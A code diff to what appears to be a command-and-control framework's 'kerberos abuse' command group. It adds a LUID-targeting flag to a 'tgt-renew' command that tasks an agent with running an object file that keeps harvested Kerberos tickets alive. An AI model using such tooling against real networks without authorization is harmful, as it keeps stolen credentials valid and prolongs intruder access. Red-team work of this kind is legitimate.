@@ -29,24 +29,30 @@ cmd_tgtMonitor = (
 ).registerToGroup("kerberos abuse")
 
 cmd_tgtRenew =(
-        conquest.createCommand(name="tgt-renew", description="Automatically renew Kerberos TGTs that are about to expire (async).", example="tgt-renew --interval 300 --threshold 30",
+        conquest.createCommand(name="tgt-renew", description="Automatically renew Kerberos TGTs that are about to expire (async).", example="tgt-renew --luid 0x3e4 --interval 300 --threshold 30",
                                message="Tasked agent to automatically renew Kerberos TGTs.", mitre=["T1558"])
             .addFlagInt("--interval", "seconds", "Polling interval in seconds (default: 60).", False, 60)
             .addFlagInt("--threshold", "minutes", "Ticket renewal threshold in minutes (default: 15).", False, 15)
             .addFlagString("--user", "user", "Comma-separated list of target usernames (default: all users).")
+            .addFlagString("--luid", "luid", "Comma-separated list of target LUIDs (default: all LUIDs).")
             .setHandler(lambda agentId, cmdline, args: (
                 interval := conquest.get_int(args, 0),
                 threshold := conquest.get_int(args, 1),
                 user := conquest.get_string(args, 2),
+                luid := conquest.get_string(args, 3),
 
-                bof := os.path.join(SCRIPT_DIR, "tgt-renew.x64.o"),
-                params := conquest.bof_pack("izi", [
-                    interval,       # i: Polling interval
-                    user,           # z: Target user
-                    threshold       # i: Remaining lifetime threshold
-                ]),
+                conquest.error(agentId, "Flags --user and --luid are mutually exclusive.", cmdline) if (user and luid)
+                else (
+                    bof := os.path.join(SCRIPT_DIR, "tgt-renew.x64.o"),
+                    params := conquest.bof_pack("iizz", [
+                        interval,       # i: Polling interval
+                        threshold,      # i: Remaining lifetime threshold
+                        user,           # z: Target users
+                        luid            # z: Target LUIDs 
+                    ]),
 
-                conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
-                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
+                    conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
+                    else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
+                )
             ))
 ).registerToGroup("kerberos abuse")
